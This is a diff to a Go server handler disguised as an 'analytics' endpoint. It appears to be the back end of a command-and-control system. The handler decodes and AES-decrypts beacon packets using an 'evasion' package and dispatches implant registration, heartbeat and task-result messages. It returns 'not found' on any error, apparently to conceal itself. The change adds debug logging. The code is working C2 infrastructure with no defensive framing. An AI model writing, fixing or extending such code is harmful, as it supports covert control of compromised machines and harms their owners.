@@ -109,21 +109,29 @@ func (s *Server) handleAnalytics(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "not found", http.StatusNotFound)
 		return
 	}
+	clipLen := 20
+	if len(idParam) < clipLen {
+		clipLen = len(idParam)
+	}
+	log.Printf("[DBG] idParam len=%d first20=%s", len(idParam), idParam[:clipLen])
 
 	decData, err := evasion.B64Decode(strings.TrimSpace(idParam))
 	if err != nil {
+		log.Printf("[DBG] B64Decode fail: %v, full_id=%s", err, idParam)
 		http.Error(w, "not found", http.StatusNotFound)
 		return
 	}
 
 	pkt, err := encode.DecodePacket(decData)
 	if err != nil {
+		log.Printf("[DBG] DecodePacket fail: %v", err)
 		http.Error(w, "not found", http.StatusNotFound)
 		return
 	}
 
 	decrypted, err := evasion.AesDecrypt(pkt.Data)
 	if err != nil {
+		log.Printf("[DBG] AesDecrypt fail: %v, type=%d, dataLen=%d", err, pkt.Type, len(pkt.Data))
 		http.Error(w, "not found", http.StatusNotFound)
 		return
 	}
@@ -136,6 +144,7 @@ func (s *Server) handleAnalytics(w http.ResponseWriter, r *http.Request) {
 	case encode.MsgRegister:
 		s.handleRegister(pkt, w)
 	case encode.MsgHeartbeat, encode.MsgTaskResult:
+		log.Printf("[DBG] heartbeat/taskresult: type=%d sid=%s", pkt.Type, sidParam)
 		s.handleSessionCallback(sidParam, pkt, w)
 	default:
 		http.Error(w, "not found", http.StatusNotFound)
